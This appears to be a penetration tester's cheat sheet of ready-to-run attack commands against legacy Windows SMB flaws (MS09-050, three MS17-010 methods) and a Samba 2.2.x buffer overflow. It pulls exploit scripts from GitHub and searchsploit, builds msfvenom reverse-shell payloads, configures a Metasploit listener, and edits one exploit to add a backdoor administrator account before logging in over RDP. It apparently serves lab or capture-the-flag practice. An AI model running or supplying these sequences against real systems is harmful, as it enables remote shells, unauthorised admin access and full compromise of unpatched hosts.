#### MS09-50
```bash - kali
wget https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py
```

```python - kal
pip2.7 install pysmb
```

```bash - kali
msfvenom -p windows/shell/reverse_tcp LHOST=$KALI LPORT=443 EXITFUNC=thread -f c
```

---
1 - Liner
```bash - kali
msfconsole -x "use exploit/multi/handler;set payload windows/shell/reverse_tcp;set EXITFUNC thread;set LHOST $Kali;set LPORT 443;run;"
```

---

```bash - kali
sudo msfdb run
```

```bash - kali
use exploit/multi/handler
```

```bash - kali
set payload windows/shell/reverse_tcp
```

```bash - kali
set EXITFUNC thread
```

```bash - kali
run
```

```bash - kali
pip install pysmb -t .
```

```bash - kali
python MS09_050.py $TARGET
```

```bash - kali
python3 ms09-050.py $TARGET
```

#### MS17-010 method 1

https://medium.com/@simonsulyma/hack-the-box-legacy-penetration-testing-without-metasploit-44b628fe870f

```bash - kali
git clone https://github.com/helviojunior/MS17-010 && cd MS17-010/ && python checker.py $TARGET
```

```bash - kali
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=443 -f exe > ms17–010.exe
```

![[rlwrap]]

```bash - kali
python send_and_execute.py $TARGET ms17–010.exe
```

#### MS17-010 method 2 (RDP)

```bash - kali
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
```

```bash - kali
searchsploit -m 42315
```

Edit 42315, replacing the block of code from 916 - 920 with the following:

```python - kali
	print('Sending exploit')
	service_exec(conn, r"cmd /c net user bob pass /add")
	service_exec(conn, r"cmd /c net localgroup administrators bob /add")
```

```bash - kali
python 42315.py $TARGET
```

```bash - kali
rdesktop -a 16 -z $TARGET -u bob -p pass
```

#### MS17-010 method 3
```bash - kali
searchsploit -m 42031
```

```bash - kali
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=443 -f raw EXITFUNC=thread -o exploit.bin
```

![[rlwrap]]

```bash - kali
python 42031.py $TARGET exploit.bin
```

#### Samba 2.2.x - Remote Buffer Overflow
```bash - kali
searchsploit -m 7
```

```bash - kali
chmod +x 7.pl
```

```bash - kali
./7.pl -t linx86 -H $KALI -h $TARGET
```

